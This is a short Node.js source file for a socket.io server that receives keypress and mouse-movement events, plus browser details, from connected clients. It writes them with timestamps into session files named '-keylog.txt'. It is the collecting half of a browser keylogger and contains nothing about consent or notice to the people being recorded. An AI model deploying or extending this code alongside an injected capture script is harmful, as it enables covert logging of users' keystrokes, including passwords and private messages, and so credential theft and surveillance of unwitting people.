var fs = require('fs'); // filestream
var server = require('http').createServer(); // native node server
var io = require('socket.io')(server); //socket
var ms = require('ms'); // timestamps

const dir = "logs/";

const Timestamp = function(started){
    var current = Date.now();
    return ms(current - started);
}

io.on('connection', function (socket) {

  var started = Date.now();
  var date = new Date();
  date = `${date.getFullYear()}_${date.getHours()}_${date.getMinutes()}`;

  // start writing to a file when a new session starts
  console.log('session started');
  var keystream = fs.createWriteStream(dir + date + '-keylog.txt', {
    flags: 'a'
  });

  keystream.write(`--- session started --- \r\n`);

  socket.on('info', function(info){
    keystream.write(`Browser is ${info} \r\n`);
  });

  // on keypress, write the contents to a file
  socket.on('keypress', function (contents) {
    let timestamp = Timestamp(started);
    keystream.write(`${timestamp}~ ${contents} \r\n`);
  });

  // on mousemove, write the contents to a file
  socket.on('mousemove', function (contents) {
    let timestamp = Timestamp(started);
    var input = JSON.parse(contents);
    keystream.write(`[click] at ${timestamp}~ X:${input.x} Y: ${input.y} \r\n`);
  });

  // once the user has disconnected, save the file and end the stream
  socket.on('disconnect', function () {
    console.log('session disconnected');
    let timestamp = Timestamp(started);
    keystream.write(` --- session disconnected after ${timestamp} --- \r\n`);
    keystream.end(); // save the file;
  });
});

server.listen(1338);
console.log("server started");
